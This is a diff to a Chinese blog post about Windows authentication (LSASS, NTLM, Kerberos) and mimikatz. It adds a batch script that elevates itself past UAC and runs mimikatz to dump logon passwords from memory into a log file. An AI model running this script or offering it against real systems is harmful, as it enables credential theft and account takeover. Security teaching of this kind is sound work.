@@ -113,7 +113,7 @@
 <meta property="og:description" content="概述 先来了解一下lsass进程。Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies">
 <meta property="og:image" content="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png">
 <meta property="og:image" content="http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzdmp.png">
-<meta property="og:updated_time" content="2017-10-09T06:41:51.000Z">
+<meta property="og:updated_time" content="2018-01-17T11:42:01.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="windows认证机制以及常见密码获取工具分析">
 <meta name="twitter:description" content="概述 先来了解一下lsass进程。Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies">
@@ -390,13 +390,17 @@
 <li>NTLM</li>
 <li>Kerberos<h4 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h4><a href="http://smartechverse.blogspot.com/2015/06/crack-windows-admin-password-and-sam.html" target="_blank" rel="external">Crack windows Admin Password and Sam Files</a><br><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="external">The NTLM Authentication Protocol and Security Support Provider</a><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4></li>
 <li>内存导出<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png" alt=""></li>
-<li>从本地获取密码<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzdmp.png" alt=""><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li>从本地获取密码<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzdmp.png" alt=""></li>
+<li>自动获取内存密码bat脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">@echo off</div><div class="line">&gt;nul 2&gt;&amp;1 &quot;%SYSTEMROOT%\system32\cacls.exe&quot; &quot;%SYSTEMROOT%\system32\config\system&quot;</div><div class="line">if &apos;%errorlevel%&apos; NEQ &apos;0&apos; (</div><div class="line">goto UACPrompt</div><div class="line">) else ( goto gotAdmin )</div><div class="line">:UACPrompt</div><div class="line">echo Set UAC = CreateObject^(&quot;Shell.Application&quot;^) &gt; &quot;%temp%\getadmin.vbs&quot;</div><div class="line">echo UAC.ShellExecute &quot;%~s0&quot;, &quot;&quot;, &quot;&quot;, &quot;runas&quot;, 1 &gt;&gt; &quot;%temp%\getadmin.vbs&quot;</div><div class="line">&quot;%temp%\getadmin.vbs&quot;</div><div class="line">exit /B</div><div class="line">:gotAdmin</div><div class="line">if exist &quot;%temp%\getadmin.vbs&quot; ( del &quot;%temp%\getadmin.vbs&quot; )</div><div class="line">pushd &quot;%CD%&quot;</div><div class="line">CD /D &quot;%~dp0&quot;</div><div class="line"></div><div class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul>
 <li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx</a></li>
 <li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx</a></li>
 <li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx</a></li>
 <li><a href="http://blog.csdn.net/qq_26886929/article/details/53905654" target="_blank" rel="external">http://blog.csdn.net/qq_26886929/article/details/53905654</a></li>
 <li><a href="http://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="external">http://blog.csdn.net/wulantian/article/details/42418231</a></li>
-<li><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/wiki</a></li>
+<li><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/wiki</a><br><a href="https://room362.com/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" target="_blank" rel="external">USING MIMIKATZ ALPHA OR GETTING CLEAR TEXT PASSWORDS WITH A MICROSOFT TOOL</a></li>
 </ul>
 
       
